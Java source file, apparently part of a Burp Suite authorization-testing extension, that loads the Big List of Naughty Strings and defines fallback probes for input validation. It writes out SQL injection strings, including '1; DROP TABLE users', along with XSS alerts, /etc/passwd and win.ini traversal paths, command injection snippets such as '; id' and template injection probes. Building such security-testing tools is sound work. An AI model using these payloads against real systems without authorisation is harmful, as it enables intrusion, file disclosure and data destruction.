// Created with the help of an AI Agent and littlespidy.
package com.protect7.authanalyzer.inputvalidation;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Loads and categorizes payloads from the Big List of Naughty Strings (BLNS).
 */
public class InputValidationPayloadLoader_littlespidy {

    private static final String RESOURCE_PATH = "/big-list-of-naughty-strings.txt";

    // Set of payload values considered high-signal default essential probes
    private static final Set<String> DEFAULT_ESSENTIAL_STRINGS = new HashSet<>();

    static {
        // Boundary
        DEFAULT_ESSENTIAL_STRINGS.add("");
        DEFAULT_ESSENTIAL_STRINGS.add("-1");
        DEFAULT_ESSENTIAL_STRINGS.add("0");
        DEFAULT_ESSENTIAL_STRINGS.add("99999999999999999999");
        DEFAULT_ESSENTIAL_STRINGS.add("%00");

        // SQL Injection
        DEFAULT_ESSENTIAL_STRINGS.add("' OR 1=1 -- 1");
        DEFAULT_ESSENTIAL_STRINGS.add("' OR '1'='1' -- -");
        DEFAULT_ESSENTIAL_STRINGS.add("\" OR \"1\"=\"1");
        DEFAULT_ESSENTIAL_STRINGS.add("' UNION SELECT null, null -- -");
        DEFAULT_ESSENTIAL_STRINGS.add("1' AND 1=CONVERT(int, @@version) --");
        DEFAULT_ESSENTIAL_STRINGS.add("'; WAITFOR DELAY '0:0:5'--");
        DEFAULT_ESSENTIAL_STRINGS.add("1; DROP TABLE users");
        DEFAULT_ESSENTIAL_STRINGS.add("1'; SELECT pg_sleep(5)--");
        DEFAULT_ESSENTIAL_STRINGS.add("'\\\"><;|\\\\][}{`$");

        // Script Injection / XSS
        DEFAULT_ESSENTIAL_STRINGS.add("<script>alert(123)</script>");
        DEFAULT_ESSENTIAL_STRINGS.add("\"><script>alert(\"XSS\")</script>");
        DEFAULT_ESSENTIAL_STRINGS.add("\"><img src=x onerror=alert(1)>");
        DEFAULT_ESSENTIAL_STRINGS.add("'\"<svg/onload=alert(1)>");
        DEFAULT_ESSENTIAL_STRINGS.add("javascript:alert(1)");

        // File Inclusion / Path Traversal
        DEFAULT_ESSENTIAL_STRINGS.add("/../../../../../../../../../../../etc/passwd%00");
        DEFAULT_ESSENTIAL_STRINGS.add("../../../../../../../../etc/passwd");
        DEFAULT_ESSENTIAL_STRINGS.add("../../../../../../../../windows/win.ini");
        DEFAULT_ESSENTIAL_STRINGS.add("....//....//....//etc/passwd");
        DEFAULT_ESSENTIAL_STRINGS.add("%2e%2e%2f%2e%2e%2fetc%2fpasswd");
        DEFAULT_ESSENTIAL_STRINGS.add("/etc/passwd%00.png");

        // Command Injection
        DEFAULT_ESSENTIAL_STRINGS.add("; id");
        DEFAULT_ESSENTIAL_STRINGS.add("| id");
        DEFAULT_ESSENTIAL_STRINGS.add("`id`");
        DEFAULT_ESSENTIAL_STRINGS.add("$(id)");
        DEFAULT_ESSENTIAL_STRINGS.add("& whoami");

        // Server Code Injection / SSTI
        DEFAULT_ESSENTIAL_STRINGS.add("{{7*7}}");
        DEFAULT_ESSENTIAL_STRINGS.add("${7*7}");
        DEFAULT_ESSENTIAL_STRINGS.add("<%= 7*7 %>");
        DEFAULT_ESSENTIAL_STRINGS.add("#{7*7}");
        DEFAULT_ESSENTIAL_STRINGS.add("*{7*7}");

        // Reserved / Type Confusion
        DEFAULT_ESSENTIAL_STRINGS.add("null");
        DEFAULT_ESSENTIAL_STRINGS.add("undefined");
        DEFAULT_ESSENTIAL_STRINGS.add("None");
        DEFAULT_ESSENTIAL_STRINGS.add("CON");
    }

    public static List<InputValidationPayload_littlespidy> loadAllPayloads() {
        List<InputValidationPayload_littlespidy> list = new ArrayList<>();
        InputStream is = InputValidationPayloadLoader_littlespidy.class.getResourceAsStream(RESOURCE_PATH);
        if (is == null) {
            is = InputValidationPayloadLoader_littlespidy.class.getResourceAsStream("big-list-of-naughty-strings.txt");
        }
        if (is == null) {
            // Check filesystem paths
            File f = new File("resources/big-list-of-naughty-strings.txt");
            if (!f.exists()) {
                f = new File("big-list-of-naughty-strings.txt");
            }
            if (f.exists()) {
                try {
                    is = new FileInputStream(f);
                } catch (Exception ignored) {}
            }
        }

        if (is != null) {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                String line;
                String currentCategory = "General";
                boolean inEmojiSection = false;
                int counter = 1;

                while ((line = reader.readLine()) != null) {
                    String trimmed = line.trim();
                    if (trimmed.startsWith("#")) {
                        // Section header check
                        String header = trimmed.replaceFirst("^#+\\s*", "").trim();
                        if (!header.isEmpty() && !header.toLowerCase().startsWith("credit") && !header.toLowerCase().startsWith("strings which")) {
                            if (header.equalsIgnoreCase("Emoji")) {
                                inEmojiSection = true;
                            } else {
                                inEmojiSection = false;
                                currentCategory = header;
                            }
                        }
                        continue;
                    }

                    // Skip the emoji section strictly to obey the Emoji Prohibition Directive
                    if (inEmojiSection) {
                        continue;
                    }

                    if (trimmed.isEmpty()) {
                        // Include empty string as a boundary payload once under Boundary / Reserved
                        if (list.stream().noneMatch(p -> p.getValue().isEmpty())) {
                            String id = "payload_" + counter++;
                            list.add(new InputValidationPayload_littlespidy(
                                    id, "Boundary", "Empty String", "", "Empty string to test missing or unhandled input", true, true
                            ));
                        }
                        continue;
                    }

                    String value = line; // retain verbatim
                    String id = "payload_" + counter++;
                    boolean isEssential = DEFAULT_ESSENTIAL_STRINGS.contains(value);
                    String name = buildPayloadName(currentCategory, value);
                    String description = "BLNS probe for " + currentCategory;

                    list.add(new InputValidationPayload_littlespidy(
                            id, currentCategory, name, value, description, isEssential, isEssential
                    ));
                }
            } catch (Exception e) {
                // If parsing encounters an issue, fallback will supply essential payloads
            }
        }

        // If list is empty (fallback), populate baseline probes directly
        if (list.isEmpty()) {
            list = createFallbackPayloads();
        }

        return list;
    }

    private static String buildPayloadName(String category, String value) {
        String preview = value.length() > 24 ? value.substring(0, 24) + "..." : value;
        return category + ": " + preview;
    }

    public static List<InputValidationPayload_littlespidy> createFallbackPayloads() {
        List<InputValidationPayload_littlespidy> list = new ArrayList<>();
        int counter = 1;

        // Boundary
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Empty String", "", "Empty string validation bypass", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Negative Integer", "-1", "Negative number handling", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Zero", "0", "Division by zero or falsey evaluation", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Large Integer", "99999999999999999999", "Integer overflow", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Long String 200", "A".repeat(200), "Buffer / length bounds", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Boundary", "Null Byte", "%00", "Null byte truncation", true, true));

        // SQL Injection
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "Special Chars", "'\\\"><;|\\\\][}{`$", "Syntax error triggers", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "SQL Single Quote", "' OR 1=1 -- 1", "Auth bypass", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "SQL Double Quote", "\" OR \"1\"=\"1", "Double quote breakout", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "SQL Union", "' UNION SELECT null, null -- -", "Union error discovery", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "SQL Error Convert", "1' AND 1=CONVERT(int, @@version) --", "MSSQL error disclosure", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "SQL Injection", "SQL Sleep", "'; WAITFOR DELAY '0:0:5'--", "Time delay check", true, true));

        // Script Injection (XSS)
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Script Injection", "Script Tag Alert", "<script>alert(123)</script>", "Unencoded script reflection", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Script Injection", "Image OnError", "\"><img src=x onerror=alert(1)>", "Attribute breakout XSS", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Script Injection", "SVG OnLoad", "'\"<svg/onload=alert(1)>", "Inline SVG vector", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Script Injection", "Javascript URI", "javascript:alert(1)", "URI scheme injection", true, true));

        // File Inclusion
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "File Inclusion", "Linux Passwd", "/../../../../../../../../../../../etc/passwd%00", "Linux sensitive file disclosure", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "File Inclusion", "Windows WinINI", "../../../../../../../../windows/win.ini", "Windows INI disclosure", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "File Inclusion", "Nested Slashes", "....//....//....//etc/passwd", "Nested traversal bypass", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "File Inclusion", "URL Encoded Traversal", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Encoding bypass", true, true));

        // Command Injection
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Command Injection", "Semicolon ID", "; id", "Unix command concatenation", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Command Injection", "Pipe ID", "| id", "Unix pipe execution", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Command Injection", "Backtick ID", "`id`", "Inline subshell execution", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Command Injection", "POSIX Substitution", "$(id)", "Subshell evaluation", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Command Injection", "Windows WhoAmI", "& whoami", "Windows concatenation", true, true));

        // Server Code Injection / SSTI
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Server Code Injection", "Jinja2/Twig", "{{7*7}}", "Template expression 49", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Server Code Injection", "Spring JSP EL", "${7*7}", "Expression Language 49", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Server Code Injection", "Ruby ERB", "<%= 7*7 %>", "ERB expression evaluation", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Server Code Injection", "FreeMarker", "#{7*7}", "FreeMarker expression evaluation", true, true));
        list.add(new InputValidationPayload_littlespidy("p" + counter++, "Server Code Injection", "Velocity", "*{7*7}", "Velocity expression evaluation", true, true));

        return list;
    }
}
